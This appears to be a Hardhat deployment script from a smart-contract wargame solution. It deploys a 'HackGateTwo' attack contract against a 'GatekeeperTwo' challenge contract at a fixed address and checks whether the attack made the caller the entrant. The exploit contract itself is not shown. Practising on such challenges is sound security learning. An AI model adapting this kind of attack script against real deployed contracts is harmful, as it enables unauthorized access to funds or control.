import { ethers } from "hardhat";

const INSTANCE = "0x3799Ddb9eac59Ae7A7C080F997671F87f0e31E1c";

async function main() {
  const gate = await ethers.getContractAt("GatekeeperTwo", INSTANCE);

  const HackGateTwo = await ethers.getContractFactory("HackGateTwo");
  const hackGate = await HackGateTwo.deploy(gate.address);
  await hackGate.deployed();

  (await gate.entrant()) === (await ethers.getSigners())[0].address
    ? console.log("Successfully attack the contract")
    : console.log("Attack contract failed");
}

main().catch((err) => {
  console.error(err);
  process.exitCode = 1;
});
